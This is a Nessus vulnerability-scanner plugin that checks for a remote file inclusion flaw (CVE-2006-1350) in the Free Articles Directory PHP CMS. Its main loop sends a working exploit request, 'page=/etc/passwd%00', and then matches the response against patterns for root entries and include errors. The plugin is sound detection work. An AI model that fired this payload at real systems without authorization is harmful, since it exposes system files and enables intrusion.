#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#
# Changes by Tenable:
# - Revised plugin title (1/08/2009)

include("compat.inc");

if (description) {
  script_id(21146);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2006-1350");
  script_bugtraq_id(17183);
  script_osvdb_id(24024);

  script_name(english:"Free Articles Directory index.php page Parameter Remote File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Free Articles Directory, a CMS written in
PHP. 

The installed version of Free Articles Directory fails to sanitize
user input to the 'page' parameter in index.php.  An unauthenticated
attacker may be able to read arbitrary local files or include a file
from a remote host that contains commands which will be executed by
the vulnerable script, subject to the privileges of the web server
process." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2006/Mar/396" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/21");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  summary["english"] = "Checks for file includes in Free Articles Directory";
  script_summary(english:summary["english"]);
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Josh Zlatin-Amishav");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# The '/99articles' directory does not seem too popular, but it is the default
# installation directory
if (thorough_tests) dirs = list_uniq(make_list("/99articles", cgi_dirs()));
else dirs = make_list(cgi_dirs());


# Loop through CGI directories.
foreach dir (dirs) {
  # Try to exploit the flaw in config.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/index.php?",
      "page=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);
  
  # There's a problem if...
  if (
    # there's an entry for root or...
    (
      'Website Powered by <strong><a href="http://www.ArticlesOne.com">ArticlesOne.com' >< res &&
      egrep(pattern:"root:.*:0:[01]:", string:res) 
    ) ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning.+/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning.+ Failed opening '/etc/passwd.+for inclusion")
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      content = strstr(res, "<input type=image name=subscribe");
      if (content) content = strstr(content, 'style="padding-left:10">');
      if (content) content = content - 'style="padding-left:10">';
      if (content) content = content - strstr(content, "</td>");
    }

    if (content)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        content
      );
      security_hole(port:port, extra:report);
    }
    else
      security_hole(port:port);
    exit(0);
  }
}
